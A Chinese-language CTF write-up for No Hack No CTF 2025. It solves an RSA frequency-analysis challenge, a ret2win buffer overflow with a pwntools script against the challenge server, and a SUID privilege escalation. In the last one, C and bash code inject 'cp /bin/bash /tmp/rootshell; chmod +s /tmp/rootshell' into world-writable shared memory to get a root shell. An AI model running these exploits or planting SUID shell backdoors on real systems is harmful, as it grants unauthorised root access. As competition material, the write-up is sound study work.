---
title: NHNCtf
published: 2025-07-08
description: 'No Hack No CTF Writeup'
image: './image.png'
tags: [CTF,Writeup]
category: 'Writeup'
draft: false 
lang: ''
---

# No Hack No CTF 2025

這次題目我主要都是圍繞在Pwn、Reverse、Crypto，但Reverse解不出來不是我熟悉的ELF跟EXE

## Crypto

### [100] bloCkchAin ciphEr'S sERcret

合約題

流程大概就是`丟網站->拿到HEX->解出flag`

### [316] FRSA 

題目給了加密腳本FRSA.py和加密結果so_wonderful_work.txt

FRSA.py:
```py
from Crypto.Util.number import *
from random import *

p = getStrongPrime(1024)
q = getStrongPrime(1024)
n = p*q
e = randrange(2**512,2**1024)

plaintext = open('wonderful_work.txt','r').read().lower()
arr = []
for i in plaintext:
        arr.append(pow(ord(i),e,n))
open('so_wonderful_work.txt','w').write(str(n)+"\n"+str(arr))
```

so_wonderful_work.txt的經過簡單觀察，有分要還原的密文跟有著30多萬字元由`[]`包起來映射。

而這段程式碼的弱點在於 for i in plaintext: 迴圈。它將明文中的每個字元（例如，所有的 'a'）都獨立加密成完全相同的密文。這意味著，只要我們能統計出哪個密文出現最多次，就能推斷出它對應哪個最常見的英文字元。

所以就生一個架構，一直去手動測試，然後再好幾個小時的努力就可以還原文

腳本運行結果:
```
================================================================================
目前的對照表: '6405299485...' -> 'o'  '0646033379...' -> 'c'  '7693470592...' -> 'r'  '8544458474...' -> 'n'  '5487013167...' -> 'h'  '8542905841...' -> 'u'  '7534940872...' -> 'b'  '5802447197...' -> 'a'  '5720443804...' -> 'i'  '4296177043...' -> 't'  '1335244995...' -> 'e'  '7978034037...' -> ' '  '8956932056...' -> 's'

--- 部分解密文本 (僅顯示前 500 字元) ---
in _enera_ _o_taire said this inad_ertent_y a _ew __ies bite a _ew ti_es ne_er can detain a heroic _a__o_in_ horse this see_s to _a_e a _ot o_ sense ri_ht the _uic_ brown _o_ _u__s o_er the _a_y do_ de_ocritus once said this dont _oo_ at e_eryone with distrust but be _ir_ and _ir_ this is indeed a wise sayin_ then what ba_ehot once said a _ir_ be_ie_ can _a_e the heart o_ the stron_ _ir_ and they are _ore deter_ined a_thou_h this sentence is short it _a_es _e thin_ about it why does nhncthisisrsaand_re_uencyana_ysis ha__en
---
```

還原出差不多10的字母就大該猜到了是`nhncthisisrsaandfrequencyanalysis`

所以flag就是`NHNC{THIS_IS_RSA_AND_FREQUENCY_ANALYSIS}`

## Pwn

### [253] clannad_is_g00d_anim3 
運氣好搶到首殺

![image](https://hackmd.io/_uploads/H10r--KHxe.png)

source code:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char *gets(char *s);

int Clannad(){
  system("/bin/sh");
}

int vuln(){
  char buffer[64];
  printf("Welcome to the world of dango daikazoku\n");
  printf("enter a dango:");
  gets(buffer);
}

int main(){
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);

  vuln();
  printf("Hello\n");
  return 0;
}
```

其實就真的是非常簡單的ret2win，但題目沒有給執行檔，所以可以從Docker裡面翻看看是怎麼編譯的。

`
gcc /home/ctf/chall.c -o /home/ctf/chall -fno-stack-protector -z execstack -no-pie
`

exp:

```py
from pwn import *

context.arch='amd64'
r=remote('chal.78727867.xyz',9999)
#r=process('./chall')

p=b'A'*72+p64(0x40101a)+p64(0x4011b6)
#gdb.attach(r)
r.sendlineafter(b':',p)

r.interactive()
```

到底這題為什麼沒有貶到100分?

### [475] Server Status

跟Server Status Revenge一模一樣解法，先解比較難題目的好處?

### [484] Server Status Revenge

![image](https://hackmd.io/_uploads/ByIzQZKSgg.png)

題目給了個SSH，連線到伺服器後，發現家目錄下只有一個名為 server_status 的檔案，執行 `./server_status`，得到以下輸出：

```
=== Server Status Monitor v1.0 ===
System diagnostic tool with root privileges
Running with elevated privileges (UID: 0, GID: 0)
...
=== Command Output ===
dmesg: read kernel buffer failed: Operation not permitted
=== End of Output ===
...
```

所以可以猜測這是一題利用 SUID+Privilege Escalation漏洞，打開家目錄也果然有flag。因為題目沒有任何逆向工具，所以我是直接`cat server_status`，然後可以看到很多亂碼跟大量與共享記憶體相關的函式`shmget`, `shmat`, `shmdt`,`popen`。

所以可以假設初步結論:server_status是一個SUID root程式，它會從共享記憶體中讀取一個指令，然後用popen執行它。

ps:
- `shmget`：取得共享記憶體段。

- `shmat`：將共享記憶體段 attach 到自己的記憶體空間。

- `shmdt`：detach。

- `popen`：開啟一個 subprocess 並且可以讀取它的輸出


直接說結論，使用`watch -n 0.1 ipcs -m`，發現可以成功在 server_status執行時捕捉到了它所創建的共享記憶體區段，並發現每次執行其Key值都不同，而且其權限為666，代表任何使用者都可以讀寫。

所以我們思路就是構造可以自動`偵測->提取key->注入`的腳本。

write.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/shm.h>

int main(int argc, char *argv[]) {
    if (argc != 2) return 1;

    key_t key = (key_t)strtol(argv[1], NULL, 0);
    const char* cmd = "cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell";

    int shmid = shmget(key, 1024, 0666);
    if (shmid == -1) return 1;

    char *shmaddr = shmat(shmid, NULL, 0);
    if (shmaddr == (void*)-1) return 1;

    strcpy(shmaddr, cmd);
    shmdt(shmaddr);
    return 0;
}
```

final_attack.sh
```sh
#!/bin/bash

gcc writer.c -o writer

./server_status &

#核心攻擊邏輯，用 ipcs、grep、awk 找出動態 Key
KEY=""
for i in {1..10}; do
    KEY=$(ipcs -m | grep 'root' | awk '{print $1}')
    if [ ! -z "$KEY" ]; then
        break
    fi
    sleep 0.01
done

if [ ! -z "$KEY" ]; then
    echo "Found dynamic key: $KEY, launching attack!"
    ./writer $KEY
fi
```

運行結果:
```
hacker@f347792128f8:~$ ./final_attack.sh
=== Server Status Monitor v1.0 ===
System diagnostic tool with root privileges

Running with elevated privileges (UID: 0, GID: 0)
Initializing...
Hacking Nasa...
*Found dynamic key: 0x0002216f, launching attack!
********************ls: cannot access '/tmp/rootshell': No such file or directory
hacker@f347792128f8:~$ *******************
Done!
=== Command Output ===
=== End of Output ===

System status check completed successfully!
^C
hacker@f347792128f8:~$ /tmp/rootshell -p
cat /flag
rootshell-5.1# ls
creator    exploit    exploit_final    final_attack.sh  race_final.sh  read_shm_v2.c  writer
creator.c  exploit.c  exploit_final.c  race.sh          read_shm_v2    server_status  writer.c
rootshell-5.1# cd /
rootshell-5.1# ls
bin  boot  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  userid  usr  var
rootshell-5.1# cat flag
NHNC{WTF_NEVER_MADE_Challenges_at_night_especially_when_u_r_sleepy_e98525ca34b243ef9c315a1a0861f1cf}rootshell-5.1#
```

## 總結

![image](https://hackmd.io/_uploads/ryj6rLKHll.png)

